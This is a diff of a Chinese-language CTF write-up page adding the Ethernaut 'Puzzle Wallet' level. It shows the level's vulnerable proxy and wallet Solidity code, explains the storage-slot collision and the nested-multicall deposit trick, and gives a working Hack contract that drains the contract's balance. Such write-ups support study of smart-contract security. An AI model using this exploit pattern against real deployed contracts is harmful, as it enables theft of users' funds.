@@ -2814,6 +2814,13 @@
   
 </li>
       
+        <li class="md-nav__item">
+  <a href="#24-puzzle-wallet" class="md-nav__link">
+    24. Puzzle Wallet
+  </a>
+  
+</li>
+      
     </ul>
   
 </nav>
@@ -3330,6 +3337,13 @@
         <li class="md-nav__item">
   <a href="#23-dex-two" class="md-nav__link">
     23. Dex Two
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#24-puzzle-wallet" class="md-nav__link">
+    24. Puzzle Wallet
   </a>
   
 </li>
@@ -5152,13 +5166,146 @@ f3  // return
 </code></pre></div>
 </li>
 </ul>
+<h2 id="24-puzzle-wallet">24. Puzzle Wallet<a class="headerlink" href="#24-puzzle-wallet" title="Permanent link">&para;</a></h2>
+<p>成为代理合约的管理员</p>
+<div class="highlight"><pre><span></span><code><span class="c1">// SPDX-License-Identifier: MIT</span>
+<span class="nx">pragma</span><span class="w"> </span><span class="nx">solidity</span><span class="w"> </span><span class="o">^</span><span class="mf">0.8.0</span><span class="p">;</span>
+<span class="nx">pragma</span><span class="w"> </span><span class="nx">experimental</span><span class="w"> </span><span class="nx">ABIEncoderV2</span><span class="p">;</span><span class="w"> </span><span class="c1">// redundant</span>
+
+<span class="k">import</span><span class="w"> </span><span class="s2">&quot;../helpers/UpgradeableProxy-08.sol&quot;</span><span class="p">;</span>
+
+<span class="nx">contract</span><span class="w"> </span><span class="nx">PuzzleProxy</span><span class="w"> </span><span class="nx">is</span><span class="w"> </span><span class="nx">UpgradeableProxy</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nx">address</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">pendingAdmin</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">address</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">admin</span><span class="p">;</span>
+
+<span class="w">    </span><span class="kr">constructor</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">_admin</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="w"> </span><span class="nx">_implementation</span><span class="p">,</span><span class="w"> </span><span class="nx">bytes</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="nx">_initData</span><span class="p">)</span><span class="w"> </span><span class="nx">UpgradeableProxy</span><span class="p">(</span><span class="nx">_implementation</span><span class="p">,</span><span class="w"> </span><span class="nx">_initData</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">admin</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">_admin</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="nx">modifier</span><span class="w"> </span><span class="nx">onlyAdmin</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="nx">require</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nx">admin</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;Caller is not the admin&quot;</span><span class="p">);</span>
+<span class="w">      </span><span class="nx">_</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">proposeNewAdmin</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">_newAdmin</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">pendingAdmin</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">_newAdmin</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">approveNewAdmin</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">_expectedAdmin</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">onlyAdmin</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">require</span><span class="p">(</span><span class="nx">pendingAdmin</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nx">_expectedAdmin</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;Expected new admin by the current admin is not the pending admin&quot;</span><span class="p">);</span>
+<span class="w">        </span><span class="nx">admin</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">pendingAdmin</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">upgradeTo</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">_newImplementation</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">onlyAdmin</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">_upgradeTo</span><span class="p">(</span><span class="nx">_newImplementation</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="p">}</span>
+
+<span class="nx">contract</span><span class="w"> </span><span class="nx">PuzzleWallet</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nx">address</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">owner</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">uint256</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">maxBalance</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">mapping</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">bool</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">whitelisted</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">mapping</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">uint256</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">balances</span><span class="p">;</span>
+
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">init</span><span class="p">(</span><span class="nx">uint256</span><span class="w"> </span><span class="nx">_maxBalance</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">require</span><span class="p">(</span><span class="nx">maxBalance</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;Already initialized&quot;</span><span class="p">);</span>
+<span class="w">        </span><span class="nx">maxBalance</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">_maxBalance</span><span class="p">;</span>
+<span class="w">        </span><span class="nx">owner</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="nx">modifier</span><span class="w"> </span><span class="nx">onlyWhitelisted</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">require</span><span class="p">(</span><span class="nx">whitelisted</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">],</span><span class="w"> </span><span class="s2">&quot;Not whitelisted&quot;</span><span class="p">);</span>
+<span class="w">        </span><span class="nx">_</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">setMaxBalance</span><span class="p">(</span><span class="nx">uint256</span><span class="w"> </span><span class="nx">_maxBalance</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">onlyWhitelisted</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="nx">require</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">).</span><span class="nx">balance</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;Contract balance is not 0&quot;</span><span class="p">);</span>
+<span class="w">      </span><span class="nx">maxBalance</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">_maxBalance</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">addToWhitelist</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">addr</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">require</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nx">owner</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;Not the owner&quot;</span><span class="p">);</span>
+<span class="w">        </span><span class="nx">whitelisted</span><span class="p">[</span><span class="nx">addr</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">deposit</span><span class="p">()</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">payable</span><span class="w"> </span><span class="nx">onlyWhitelisted</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="nx">require</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">).</span><span class="nx">balance</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="nx">maxBalance</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;Max balance reached&quot;</span><span class="p">);</span>
+<span class="w">      </span><span class="nx">balances</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="nx">msg</span><span class="p">.</span><span class="nx">value</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">execute</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">to</span><span class="p">,</span><span class="w"> </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">value</span><span class="p">,</span><span class="w"> </span><span class="nx">bytes</span><span class="w"> </span><span class="nx">calldata</span><span class="w"> </span><span class="nx">data</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">payable</span><span class="w"> </span><span class="nx">onlyWhitelisted</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">require</span><span class="p">(</span><span class="nx">balances</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="nx">value</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;Insufficient balance&quot;</span><span class="p">);</span>
+<span class="w">        </span><span class="nx">balances</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span><span class="w"> </span><span class="o">-=</span><span class="w"> </span><span class="nx">value</span><span class="p">;</span>
+<span class="w">        </span><span class="p">(</span><span class="nx">bool</span><span class="w"> </span><span class="nx">success</span><span class="p">,</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">to</span><span class="p">.</span><span class="nx">call</span><span class="p">{</span><span class="w"> </span><span class="nx">value</span><span class="o">:</span><span class="w"> </span><span class="nx">value</span><span class="w"> </span><span class="p">}(</span><span class="nx">data</span><span class="p">);</span>
+<span class="w">        </span><span class="nx">require</span><span class="p">(</span><span class="nx">success</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;Execution failed&quot;</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">multicall</span><span class="p">(</span><span class="nx">bytes</span><span class="p">[]</span><span class="w"> </span><span class="nx">calldata</span><span class="w"> </span><span class="nx">data</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">payable</span><span class="w"> </span><span class="nx">onlyWhitelisted</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">bool</span><span class="w"> </span><span class="nx">depositCalled</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span>
+<span class="w">        </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="nx">uint256</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">0</span><span class="p">;</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="nx">data</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span><span class="w"> </span><span class="nx">i</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="nx">bytes</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="nx">_data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">data</span><span class="p">[</span><span class="nx">i</span><span class="p">];</span>
+<span class="w">            </span><span class="nx">bytes4</span><span class="w"> </span><span class="nx">selector</span><span class="p">;</span>
+<span class="w">            </span><span class="nx">assembly</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                </span><span class="nx">selector</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">mload</span><span class="p">(</span><span class="nx">add</span><span class="p">(</span><span class="nx">_data</span><span class="p">,</span><span class="w"> </span><span class="mf">32</span><span class="p">))</span>
+<span class="w">            </span><span class="p">}</span>
+<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">selector</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">deposit</span><span class="p">.</span><span class="nx">selector</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                </span><span class="nx">require</span><span class="p">(</span><span class="o">!</span><span class="nx">depositCalled</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;Deposit can only be called once&quot;</span><span class="p">);</span>
+<span class="w">                </span><span class="c1">// Protect against reusing msg.value</span>
+<span class="w">                </span><span class="nx">depositCalled</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span>
+<span class="w">            </span><span class="p">}</span>
+<span class="w">            </span><span class="p">(</span><span class="nx">bool</span><span class="w"> </span><span class="nx">success</span><span class="p">,</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">).</span><span class="nx">delegatecall</span><span class="p">(</span><span class="nx">data</span><span class="p">[</span><span class="nx">i</span><span class="p">]);</span>
+<span class="w">            </span><span class="nx">require</span><span class="p">(</span><span class="nx">success</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;Error while delegating call&quot;</span><span class="p">);</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+<ul>
+<li>
+<p>调用逻辑合约 <code>PuzzleWallet</code> 相关函数需要在白名单内且只有 <code>owner</code> 才能添加指定地址到白名单</p>
+<div class="highlight"><pre><span></span><code><span class="o">&gt;&gt;</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">contract</span><span class="p">.</span><span class="nx">whitelisted</span><span class="p">(</span><span class="nx">player</span><span class="p">)</span>
+<span class="kc">false</span>
+<span class="o">&gt;&gt;</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">contract</span><span class="p">.</span><span class="nx">owner</span><span class="p">()</span>
+<span class="s2">&quot;&lt;level-address&gt;&quot;</span><span class="w"> </span>
+</code></pre></div>
+</li>
+<li>
+<p>由于使用代理调用的方式，代理合约的 <code>pendingAdmin</code> 与逻辑合约的 <code>owner</code> 共享一个 slot，因而可先通过 <code>proposeNewAdmin</code> 更新 <code>owner</code>，随后将玩家添加到白名单中</p>
+</li>
+<li>同理，<code>maxBalance</code> 与 <code>admin</code> 共享一个 slot，而 <code>maxBalance</code> 可通过 <code>setMaxBalance</code> 更新，但首先需清空代理合约的余额</li>
+<li>
+<p>注意到 <code>multicall</code> 中 <code>depositCalled</code> 不是状态变量而是本地变量，因而嵌套调用 <code>multicall</code> 可绕过限制进行重复 <code>deposit</code></p>
+<div class="highlight"><pre><span></span><code><span class="c1">// 部署后将攻击合约添加到白名单中</span>
+<span class="nx">contract</span><span class="w"> </span><span class="nx">Hack</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nx">PuzzleWallet</span><span class="w"> </span><span class="nx">wallet</span><span class="p">;</span>
+
+<span class="w">    </span><span class="kr">constructor</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">instance</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">wallet</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">PuzzleWallet</span><span class="p">(</span><span class="nx">instance</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="c1">// msg.value 设置为代理合约余额的 2 倍</span>
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">exploit</span><span class="p">()</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">payable</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">bytes</span><span class="p">[]</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="nx">data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">bytes</span><span class="p">[](</span><span class="mf">2</span><span class="p">);</span>
+<span class="w">        </span><span class="nx">bytes</span><span class="p">[]</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="nx">subdata</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">bytes</span><span class="p">[](</span><span class="mf">1</span><span class="p">);</span>
+<span class="w">        </span><span class="nx">data</span><span class="p">[</span><span class="mf">0</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">abi</span><span class="p">.</span><span class="nx">encodeWithSignature</span><span class="p">(</span><span class="s2">&quot;deposit()&quot;</span><span class="p">);</span>
+<span class="w">        </span><span class="nx">subdata</span><span class="p">[</span><span class="mf">0</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">data</span><span class="p">[</span><span class="mf">0</span><span class="p">];</span>
+<span class="w">        </span><span class="nx">data</span><span class="p">[</span><span class="mf">1</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">abi</span><span class="p">.</span><span class="nx">encodeWithSignature</span><span class="p">(</span><span class="s2">&quot;multicall(bytes[])&quot;</span><span class="p">,</span><span class="w"> </span><span class="nx">subdata</span><span class="p">);</span>
+<span class="w">        </span><span class="nx">wallet</span><span class="p">.</span><span class="nx">multicall</span><span class="p">{</span><span class="nx">value</span><span class="o">:</span><span class="w"> </span><span class="nx">msg</span><span class="p">.</span><span class="nx">value</span><span class="p">}(</span><span class="nx">data</span><span class="p">);</span>
+<span class="w">        </span><span class="nx">wallet</span><span class="p">.</span><span class="nx">execute</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span><span class="w"> </span><span class="nx">msg</span><span class="p">.</span><span class="nx">value</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mf">2</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;&quot;</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+</li>
+<li>
+<p><code>delegatecall</code> 保持合约被调用时的 <code>msg.value</code></p>
+</li>
+</ul>
 
   <hr>
 <div class="md-source-file">
   <small>
     
       最后更新:
-      <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-datetime">December 20, 2022 19:05:21</span>
+      <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-datetime">January 28, 2023 00:28:16</span>
       
     
   </small>
